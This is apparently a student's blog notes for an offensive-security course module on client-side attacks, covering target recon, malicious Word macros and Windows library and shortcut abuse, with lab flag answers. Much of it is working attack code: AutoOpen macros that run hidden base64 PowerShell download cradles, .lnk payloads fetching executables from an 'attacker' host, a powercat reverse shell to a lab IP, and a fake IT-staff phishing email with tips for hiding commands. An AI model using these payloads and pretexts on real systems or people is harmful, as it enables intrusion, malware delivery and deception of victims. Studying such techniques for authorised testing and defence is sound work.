---
title: "PEN-200 Module 11 \u2014 Client-Side Tradecraft"
slug: client-side-attacks
author: m4xx3d0ut
summary: "Client-side compromises hinge on believable pretext, payload quality, and\
  \ disciplined logging. The lab notes captured repeatable recipes\u2014this update\
  \ folds them in."
publishedAt: '2023-09-06'
updatedAt: '2023-09-09'
readingMinutes: 28
tags:
- offsec
---
# PEN-200 Module 11 — Client-Side Tradecraft

## TLDR;

Client-side compromises hinge on believable pretext, payload quality, and disciplined logging. The lab notes captured repeatable recipes—this update folds them in.

### Recon That Drives Pretext

- Mine LinkedIn, GitHub, and company press releases for tooling references (Office macros, Adobe forms, Teams).
- Capture target operating systems with web beacon lures or email auto-responses; record user-agent strings.
- Build a spreadsheet of candidate targets, their job roles, and the lure theme that fits (e.g., “Quarterly security update”).

### Macro Payload Workflow

1. Draft the lure document (existing corporate template, logos, styles).
2. Embed the macro in `ThisDocument` or `AutoOpen`.
3. Stage payloads using PowerShell-to-base64 encoding.

```
payload=$(echo -n "IEX(New-Object Net.WebClient).DownloadString('https://attacker/payload.ps1')" | iconv -t UTF-16LE | base64 -w 0)
cat <<'VBA' > macro.vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -enc " & """$payload"""
    CreateObject("Wscript.Shell").Run cmd
End Sub
VBA
```

4. Sign the macro if the client provides a code-signing cert; log hash, timestamp, and signer.
5. Validate in a sandbox (Hyper-V/VMware snapshot) before delivery.

### Windows Library & Shortcut Abuses

- Craft `.library-ms` pointing to an attacker-controlled share; host payload DLLs via SMB/WebDAV.
- Build `.lnk` shortcuts launching PowerShell or `regsvr32 /s /n /u /i:https://... scrobj.dll` commands.

```
mklink payload.lnk "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
powershell.exe -Command "$client = New-Object Net.WebClient; $client.DownloadFile('https://attacker/payload.exe','%TEMP%\upd.exe'); Start-Process '%TEMP%\upd.exe'"
```

Document which Windows warning prompts appear during testing; include mitigations (MOTW enforcement, macro policy) in the report.

### Delivery & Tracking

- Send emails via `swaks` with SPF/DKIM-aligned headers if the client authorises domain spoofing.
- Track opens and payload callbacks with unique IDs per recipient (append `?id=alice` to URLs, embed beacon images).
- Record timezone, send time, and follow-up results in the engagement timeline.

### Defensive Counterpoints

- Recommend enabling `Block macros from the Internet`, deploying AMSI-aware scanners, and enforcing application control.
- Provide detection pointers: Event IDs (3008 macro execution, 4104 PowerShell script block), Sysmon configs catching LOLBAS abuse.

Client-side operations reward preparation. Blend into genuine workflows, keep payload telemetry, and deliver actionable blue-team guidance alongside the exploit narrative.

## Working Notes... In Graphic Detail...

#### Client Side Attacks

- Target Reconnaissance.
- Exploiting Microsoft Office.
- Abusing Windows Library Files.

##### 11.1 Target Reconnaissance

- Gather information to prepare client-side attacks.
- Leverage client fingerprinting to obtain information.

##### Information Gathering

- Methods of enumerating targets installed software without interacting directly.
    - Suited for cases where we have no way to interact.
    - We wil not alert monitoring systems or leave forensic traces.

**Metadata of publicly available docs**

- [Metadata](https://exiftool.org/TagNames/) can be sanitized, but is often not.
- Tags categorized by [tag groups](https://exiftool.org/#Tag%20Groups)
    - Can include;
        - Author.
        - Creation date.
        - Name and version of software used to create the doc.
        - OS of client.
        - Etc.
- Data is sometimes;
    - Explicitly stored in metadata.
    - Infered from the doc iteself.
- Keep in mind.
    - This information can be stale.
    - Diff branches of the same org may use diff software.
- This approach is "hands-off".
    - We may not gather accurate info.
    - Still a viable and effective approach.

**Techniques**

- Leverage inforamtion gathering methods.
    - Google dorking.
        - `site:example.com filetype:pdf`
        - Finds PDFs on target webpage.
        - Adding keywords to narrow results.
    - Website enumeration tools.
        - [gobuster](https://github.com/OJ/gobuster)
            - `-x` param to search for specific file extensions on target site.
            - However this is noisy and will generate log entries.
        - Can also manually browse taget site.

**Example:**

```
┌──(operator㉿labhost)-[~/OffSec/client-side]
└─$ exiftool -a -u brochure.pdf 
ExifTool Version Number         : 12.65
File Name                       : brochure.pdf
Directory                       : .
File Size                       : 311 kB
File Modification Date/Time     : 2023:09:07 07:50:49-07:00
File Access Date/Time           : 2023:09:07 07:50:49-07:00
File Inode Change Date/Time     : 2023:09:07 07:50:52-07:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 4
Language                        : de-DE
Tagged PDF                      : Yes
XMP Toolkit                     : Image::ExifTool 12.41
Creator                         : Stanley Yelnats
Title                           : Mountain Vegetables
Author                          : Stanley Yelnats
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Create Date                     : 2022:04:27 07:34:01+02:00
Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
Modify Date                     : 2022:04:27 07:34:01+02:00
Document ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Instance ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Title                           : Mountain Vegetables
Author                          : Stanley Yelnats
Create Date                     : 2022:04:27 07:34:01+02:00
Modify Date                     : 2022:04:27 07:34:01+02:00
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Creator                         : Stanley Yelnats
```

- Important info;
    - Creation date.
    - Last modified date.
        - Date sections reveal relative age of doc.
        - Recent dates indicate information is likely current.
    - Author's name.
        - Employee name can be used to establish a trust reltionship.
            - Drop their name casualy in target email or phone call.
            - Especially helpful if author maintains a small public profile.
    - Operating system.
    - Application used to create the doc.
        - Reveals PDF was created with "Microsoft Powerpoint for Microsoft 365".
            - Crucial for planning since there is no mention of Mac or macOS in tags.
            - Probable that Windows was used.

With this info we can now leverage client-side attack vectors from Windows System Components to maliscious Office Docs.

###### Information Gathering Exercises

Download old.pdf from the Mountain Vegetables website on VM #1 by clicking on the OLD button. Use exiftool to review the file's metadata. Enter the value of the Author tag.

```
OS{f678c053253b0510a2c0b218bf47709c}
```

Start VM #2 and use gobuster to bruteforce the contents of the web server. Specify "pdf" as the filetype and find a document other than old.pdf and brochure.pdf. After you identify the file, download it and extract the flag in the metadata.

```
┌──(operator㉿labhost)-[~/OffSec]
└─$ exiftool -a -u info.pdf             
ExifTool Version Number         : 12.65
File Name                       : info.pdf
Directory                       : .
File Size                       : 310 kB
File Modification Date/Time     : 2023:09:07 08:02:24-07:00
File Access Date/Time           : 2023:09:07 08:08:43-07:00
File Inode Change Date/Time     : 2023:09:07 08:08:43-07:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 4
Language                        : de-DE
Tagged PDF                      : Yes
XMP Toolkit                     : Image::ExifTool 11.88
Description                     : OS{e0a979b57fd890dfa555f1846e3e3a64}
```

##### Client Fingerprinting

- Client Fingerprinting to obtain OS and browser info from target in non-routable internal network.
    - [Device Fingerprinting](https://en.wikipedia.org/wiki/Device_fingerprint)
- Example;
    - We may be tasked to establish a foothold on a target network for a pentest.
    - Assume we previously extracted a target email.
        - [theHarvester](https://github.com/laramies/theHarvester)
    - We could use [HTML Application (HTA)](https://msdn.microsoft.com/en-us/library/ms536496%28VS.85%29.aspx "https://msdn.microsoft.com/en-us/library/ms536496(VS.85).aspx")
- Before we attack, we have to confirm out target is;
    - Running Windows.
    - Has IE or MS Edge enabled.
- For this purpose we can use [Canarytokens](https://canarytokens.com/)
    - Generates link with embeded token that we send to target.
    - When target opens, we get;
        - Info about their browser.
        - IP address.
        - OS.
    - With this info we can confirm the target is running Win and verify if we should attempt HTA client-side attack.

Before we create a tracking link, understand the [pretexts](https://www.imperva.com/learn/application-security/pretexting/). We can't just ask a target to click a link in an arbitrary email, so we must create a context, perhaps by leveraging the target's job role.

- Assume the target is working in a finance department.
- We could say we recieved an invoice, but it contains a financial error.
- Offer a link that we say opens a screenshot with the error highlighted.
    - This is the canarytoken link.
    - When the target clicks the link we get our info and they get a blank page.
- With our pretext defined, visit the [Canarytoken generation page](https://canarytokens.org/generate)
    - Web form provides dropdown to select type of tracking token to gen.
    - Enter email address or webhook URL for alerts.
    - To test;
        - Select `Web bug/ URL` token.
        - Enter https://example.com as webhook URL.
        - Enter Fingerprinting as comment.
        - Click "Create my Canarytoke".

```
http://canarytokens.com/tags/static/8jcpijj1da6phaduilhs51607/index.html
```

- Confirmation page contains tracking link.
- Also provides ideas on how to get target to click link.
- Next, click "Manage this token".
    - Shows options for token.
- "History" shows all visitors that clicked our token link.
    - Once triggered we can retrieve information about the target systems.
- The JS fingerprinting code more accurately IDs the OS and browser.
    - User-agent can be spoofed and not always accurate.

Canarytoken provides other fingerprinting techniques as well.

- Embed in Word Doc or PDF.
- Embed into image <---- more convincing to target.

Alternate options;

- [Grabify](https://grabify.link/)
- [fingerprint.js](https://github.com/fingerprintjs/fingerprintjs)

###### Client Fingerprinting Exercises

Reproduce the steps from this section by opening the link yourself. Open the link one time with an enabled AdBlocker and one time with a disabled AdBlocker. Answer true or false: There is no difference in the results regarding enabled or disabled AdBlocker.

```
False, although no difference was noted in Chrome Linux
```

#### 11.2 Exploiting Microsoft Office

- Understand variations of Microsoft Office client-side attacks.
- Install Microsoft Office.
- Leverage Microsoft Word Macros.

##### Preparing the Attack

Important considerations when using malicious Office Doc in a client-side attack.

- Delivery method.
    - Macro attacks are well known, email provider spam filters often filter out all MS Office Docs.
        - In most cases we can't just send it as an email attachment.
    - Most anti-phishing training programs stress the danger of enabling macros in an emailed Office Doc.

To deliver the Doc and increase the chance of target opening it, we have to use a convincing pretext and an alternate delivery method. A download link for example.

If succesfully delivered and opened, the doc will be tagged with the ["Mark of the Web" (MOTW)](https://attack.mitre.org/techniques/T1553/005/). An Office doc tagged with MOTW will open in a [protected view](https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653) which disabled editing and blocks the execution of macros or embedded objects. When a target opens a MOTW Doc, they see a warning with the option to Enable Editing.

When the target enables editing, the protected view is disabled. The most direct way to bypass MOTW is to convince the target to click Enable Editing.

- Example;
    - Blur the body of the doc and intruct the target to click the Enable Editing button to view it.

Not all Office docs have a protected view, Microsoft Publisher does not but is less frequently present on a system.

Microsoft also announced blocking macros by default. Affecting Access, Excel, PowerPoint, Visio, and Word in most Office versions from 2013-2021. Dates can be found in [MS Learn page](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked).

The Enable Content button is no longer available for Office docs delivered from the internet. A more tedious process of following a link outlining the dangers, following instructions, and checking a box in settings. This complicated the vector, but with thorough enumeration and considering the information here the chance of success increases greatly.

Despite the mitigation and heightened awareness, malicious Office Docs are still one of the most widely used client-side attack vectors. This highlights the dynamic between attacker and defender. For each security measure implemented the attacker is forced to develop a novel vectors and bypass methods. New defense mechanisms are just opportunities to develop more sophisticated attacks.

##### Leveraging Microsoft Word Macros

- Office apps like Word and Excel allow users to embed macros.
    - Macros execute a series of commands/instructions.
    - Orgs use macros to manage dynamic content and link docs to external content.
- *Macros can be written from scratch in [Visual Basic for Applications (VBA)](https://docs.microsoft.com/en-us/office/vba/api/overview/), which is a powerful scripting language with full access to [ActiveX objects](https://en.wikipedia.org/wiki/ActiveX) and the Windows Script Host, similar to JavaScript in HTML Applications.*.

Example; we will embed a macro in a Word doc to launch a reverse shell when the document is opened. Macros are one of the oldest and most well known attack vectors and still work well today, keeping in mind the mitigation described in the previous section.

- *Bear in mind that older client-side attack vectors, including [Dynamic Data Exchange (DDE)](https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN) and various [Object Linking and Embedding (OLE)](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding) methods do not work well today without significant target system modification.*.
- Create a blank Word doc `mymacro`
- Save it as a `doc`
    - Newer `docx` files require a template be attached.
        - They cannot be embeded, thus are not persistent.
    - Can also use `docm`
- Click View tab.
- Find and click the Macros button.
- In the Macro menu.
    - Enter macro name `MyMacro`
    - Select from Macros in drop down `mymacro` document.
    - Then click Create.
- This creates the Macro framework and opens a VB editor for us to develop our macro.
- We can develop from scratch or use the provided skeleton.
    - The skeleton.
        - The main sub proceedure begins with the `Sub` keyword.
        - It ends with `End Sub`
        - This is the body of the Macro.
        - *A sub procedure is very similar to a function in VBA. The difference lies in the fact that sub procedures cannot be used in expressions because they do not return any values, whereas functions do.*.
    - At this point `MyMacro()` is an emptly sub proceedure with several single line comments starting with `!` chars.

```
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

- In this example we will use ActiveX Objects.
    - They provide access to underlying system commands.
    - Achieved through the [WScript](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31%28v=vs.84%29 "https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/at5ydy31(v=vs.84)") through the [Windows Script Host Shell object](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99%28v=vs.84%29 "https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99(v=vs.84)")
    - Once the [Windows Host Shell object with CreateObject](https://learn.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/createobject-function) you can invoke the Run method for WScript.Shell to run applications on the client machine.
    - Our first macro will start powershell.

```
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

- Office macros are not executed automatically.
    - We must use the predefined AutoOpen macro and Document_Open event.
        - This will call our proceedure and run our code when the doc is opened.
        - They differ and cover special cases which the other doesn't so use both.

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

- Save, close, and reopen the doc.
- We must click the Enable Content button, then our macro runs opening powershell!

We will extend the code execution of our macro to spawn a reverse shell with powercat. We will need to use a base64 download cradle to dl powercat and start the rev shell. The encoded PowerShell command will be declared as a variable in VBA.

- **Note that VBA has a 255 char limit for literal strings** so we can't load the command as a single string.
    - This does not apply to strings stored in variables.
    - Split the command into multiple lines and concatenate them in VB.
- Go back to our macro editor.
- Declare a var names Str with the Dim keyword.
    - Used to store our powershell download cradle.
    - Will be used to execute rev shell.

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

- We will need to encode this powershell command to base64.

```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223/powercat.ps1');powercat -c 192.168.45.223 -p 4444 -e powershell
```

- Encode to Base64 string with powershell.

- Split into smaller segments of 50 chars with Python.

```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')

Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
Str = Str + "ALgAxADYAOAAuADQANQAuADIAMgAzAC8AcABvAHcAZQByAGMAY"
Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACAALQBwA"
Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
Str = Str + "A"
```

- We can use this to update our macro.

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
    Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
    Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
    Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
    Str = Str + "ALgAxADYAOAAuADQANQAuADIAMgAzAC8AcABvAHcAZQByAGMAY"
    Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
    Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACAALQBwA"
    Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
    Str = Str + "A"

    CreateObject("Wscript.Shell").Run Str
End Sub
```

- Once the macro has been saved, start a netcast listener, and close then reopen the document.
    - You can also run the macro from VBA editor to test the function.
- Note that once the macro warning has been enabled, it won't appear again unless the name of the doc changes.
- Provided we get the target to run the macro, this is a very effective and reliable method.

##### 11.3 Abusing Windows Library Files

- Prepare an attack with Windows library files.
- Leverage Windows shortcuts to obtain code execution.

###### Attaining Code Execution via Windows Library Files

Win Library files are virtual containers that connect users with content stored in remote locations;

- Web servers.
- Shares.
- They have a `.Library-ms` file extension.
- Are executed by double-clicking from explorer.

We will explore a 2 stage client-side attack;

- First stage;
    - Leverage a Win Library file to gain a foothold on a target system.
    - Use it to setup the second stage.
- Second stage;
    - Use the foothold to provide and executable file.
    - Spawn a reverse shell when double-clicked.

First stage;

- Setup a Win Library file that connects to a WebDAV share we control.
- The victim with receive a `.Library-ms`
    - Through email for example.
- When the DC the file it will appear as a regular directory in explorer.
    - We will provide a `.lnk` payload for the second stage powershell rev shell script.
    - We need to convince the user to click the `.lnk`
- *This method is stealthier than delivering the lnk through a web server/email link since most spam filters and security appliances analyze links for suspicious content before passing them to recipient*.
- On the other hand, most spam/sec systems will allow Win Library files through.
    - It also appears as a normal directory in explorer, giving the appearance of a local file.
- Setup our WebDAV share.

```
kali@kali:~$ pip3 install wsgidav           
Defaulting to user installation because normal site-packages is not writeable
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 171.3/171.3 KB 1.6 MB/s eta 0:00:00
...  
Successfully installed json5-0.9.6 wsgidav-4.0.1  
```

- After WsgiDAV install create `/home/kali/webdav` for the share.
    - This will contain out `.lnk`
    - Place `test.txt` there for now.
    - *If the installation of WsgiDAV fails with error: externally-managed-environment, we can use a virtual environment or install the package python3-wsgidav with apt. In PEP 668, a change was introduced to enforce the use of virtual environments and prevent situations in which package installations via pip break the operating system.*.
- Run WsgiDAV from the `/home/kali/.local/bin` dir or Apt install via path.
    - Specify host to serve from `-H`
        - `0.0.0.0`
    - Specify listening port `-p 80`
    - Disable auth `--auth anonymous`
    - Set WebDAV root `-r /home/kali/webdav`

```
┌──(operator㉿labhost)-[~/OffSec/win-library-files]
└─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
Running without configuration file.
12:54:48.073 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
12:54:48.075 - INFO    : WsgiDAV/4.2.0 Python/3.11.4 Linux-6.3.0-kali1-amd64-x86_64-with-glibc2.37
12:54:48.076 - INFO    : Lock manager:      LockManager(LockStorageDict)
12:54:48.076 - INFO    : Property manager:  None
12:54:48.076 - INFO    : Domain controller: SimpleDomainController()
12:54:48.076 - INFO    : Registered DAV providers by route:
12:54:48.076 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/operator/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
12:54:48.076 - INFO    :   - '/': FilesystemProvider for path '/home/operator/webdav' (Read-Write) (anonymous)
12:54:48.076 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
12:54:48.076 - WARNING : Share '/' will allow anonymous write access.
12:54:48.076 - WARNING : Share '/:dir_browser' will allow anonymous read access.
12:54:48.160 - INFO    : Running WsgiDAV/4.2.0 Cheroot/10.0.0 Python 3.11.4
12:54:48.160 - INFO    : Serving on http://0.0.0.0:80 ... 
```

- Test from local browser.
    
- Next we create the Win Library file from our Win VM.
    
    - Using VSCode or Notepad create text file `config.Library-ms`
    - Change the icon appearance to make it unassuming.
- Library files consist of 3 parts.
    
    - General Library information.
    - Library properties.
    - Library locations.
    - Refer to [Library Description Schema](https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry) for further info.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```

- Set the `name` tag.
    - NOTE this is not an arbitrary name.
    - We MUST specify the name by providing a DLL name and index.
    - We can use either name specified in MS docs;
        - @shell32.dll,-34575.
        - @windows.storage.dll,-34582.
            - We will use this on to prevent filters hitting on the word `shell32`
- The `version` tag is set to a numerical val of our choice.
    - I.e. - `6`

```
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

- Add the `isLibraryPinned` tag to `true`
    - This pins the Lib to the nav pane of Win Explorer.
    - Another small detail that makes the process more genuine to the target.
- To set the icon appearance we set `iconRefernce` the same way as we set the name.
    - Use `imageres.dll` to choose between all Win icons.
    - Index `-1002` for the Documents folder icon.
    - Index `-1003` for the Pictures folder icon.
        - This looks more benign.

```
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```

- Add `templateInfo` tag which contains `folderType` tag.
    - These determine the columns and details that appear in Explorer by default when opening the Lib.
    - The GUID must be specified using MS docs page.
    - We wil use the Documents GUID to appear convincing.
        - `{7d49d726-3c21-4f05-99aa-fdc2c9474656}`

```
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```

- The next tag marks the beginning of the library locations section.
    - Specifies the storage location where our library points to.
    - Start with the `searchConnectorDescriptionList` tag.
        - Contains a list of search connectors defined by `searchConnectorDescription`
            - Search connects are used by library files to specify connection setting of remote location.
            - We can specify one or more inside the `searchConnectorDescriptionList` tag.
            - First add the `isDefaultSaveLocation` tag set to `true`
                - Determines behavior when user saves an item.
            - Next add `isSupported` tag, which is NOT documented, and is used for compatibility set to `false`
            - Most important is the `url` tag pointing to our WebDAV.

```
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.223</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```

- Our Library is working as expected.
    - Only config is shown in the nav bar, no indication it is remote!
    - When we reopen in editor, we see that Win modified the connection info to optimize it.
        - New `serialized` tag added.
            - Base64-encoded info about the location of the url tag.
        - The content of the `url` tag has changed to `\\192.168.119.2\DavWWWRoot` optimized for Win WebDAV Client.
        - This can cause the connection failures on the target, so revert to pre-run state before delivery.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.223</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- Now we need to create our `.lnk` file and add it to the WebDAV share.
    - Right click on desktop.
    - Create new shortcut.
    - Point the shorcut to powershell and use another download cradle to load powercat and start the rev shell.

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223:8000/powercat.ps1'); powercat -c 192.168.45.223 -p 4444 -e powershell"
```

- *If the target is tech savy, place a benign command in front of our rev shell command pushing it out of the visible area of the property menu.*.
- Name the shortcut `automatic_configuration`

To test;

- Start a netcat listener.
- Start the Python HTTP server to deliver powercat.ps1.
- Double click the shortcut.
- We receive a rev shell!

Execute the attack;

- Use our webdav share to transfer the config.Library-ms and lnk file to our attacker machine.
- IRL we would use a pretext and likely email as the delivery method, example;

```
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
```

- In this case we will use WebDAV to simulate the delivery method in our lab.
- Use `smbclient` with the `-c` param to specify `'put config.Library-ms'`

```
┌──(operator㉿labhost)-[~/webdav]
└─$ ls
automatic_configuration.lnk  config.Library-ms
                                                                                         
┌──(operator㉿labhost)-[~/webdav]
└─$ smbclient //192.168.206.195/share -c 'put config.Library-ms'
Password for [WORKGROUP\operator]:
putting file config.Library-ms as \config.Library-ms (2.8 kb/s) (average 2.8 kb/s)
```

A simulated user executes the file and we get a shell!

Follow the steps in this section to get code execution on the HR137 (VM Group 1 - VM #2) system by using library and shortcut files. Be aware that after every execution of a .lnk file from the WebDAV share, the library file from the SMB share will be removed. You can find the flag on the desktop of the hsmith user. You can use VM #1 of VM Group 1 to build the library file and shortcut.

```
PS C:\Users\hsmith\Desktop> cat flag.txt
cat flag.txt
OS{e136120db43d939e68a8715d8c682b13}
```

Answer the following question with true or false: Is the .lnk file tagged with the "Mark of the Web" when you execute it in Explorer by double-clicking the Windows library file?

```
true
```

Capstone Exercise: Enumerate the ADMIN (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. Obtain a reverse shell and find the flag on the desktop for the Administrator user. You can use VM #3 of VM Group 2 to prepare your attack.

```
┌──(operator㉿labhost)-[~/OffSec/win-library-files]
└─$ nmap --script-help "*" | less


┌──(operator㉿labhost)-[~/OffSec/win-library-files]
└─$ sudo nmap -sS -sV 192.168.206.199
[sudo] password for operator: 

...
report for 192.168.206.199
Host is up (0.096s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
80/tcp  open  http          Microsoft IIS httpd 10.0
110/tcp open  pop3          hMailServer pop3d
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
445/tcp open  microsoft-ds?
587/tcp open  smtp          hMailServer smtpd
Service Info: Host: ADMIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds


┌──(operator㉿labhost)-[~/OffSec/win-library-files]
└─$ nmap -v --script "smtp-commands" 192.168.206.199

...
PORT    STATE SERVICE
25/tcp  open  smtp
| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http
110/tcp open  pop3
135/tcp open  msrpc
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
587/tcp open  submission
| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

NSE: Script Post-scanning.
Initiating NSE at 22:20
Completed NSE at 22:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds

...
PORT      STATE SERVICE       VERSION
25/tcp    open  tcpwrapped
80/tcp    open  http          Microsoft IIS httpd 10.0
110/tcp   open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  tcpwrapped
445/tcp   open  microsoft-ds?
587/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
...

┌──(operator㉿labhost)-[~/OffSec/win-library-files]
└─$ gobuster dir -x pdf -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url http://192.168.206.199

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.206.199
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.pdf             (Status: 200) [Size: 676858]
Progress: 11688 / 283418 (4.12%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 11698 / 283418 (4.13%)
===============================================================
Finished
===============================================================
```

- Interesting info in `info.pdf`
    - Local email address sytax.
        - `firstname.lastname@supermagicorg.com`
    - Test via.
		- `test@supermagicorg.com`
 - All accounts of IT staff created and usable.
		- CHECK THE METADATA!!!
```
┌──(operator㉿labhost)-[~/OffSec/client-side]
└─$ exiftool -a -u info.pdf 
ExifTool Version Number         : 12.65
File Name                       : info.pdf
Directory                       : .
File Size                       : 677 kB
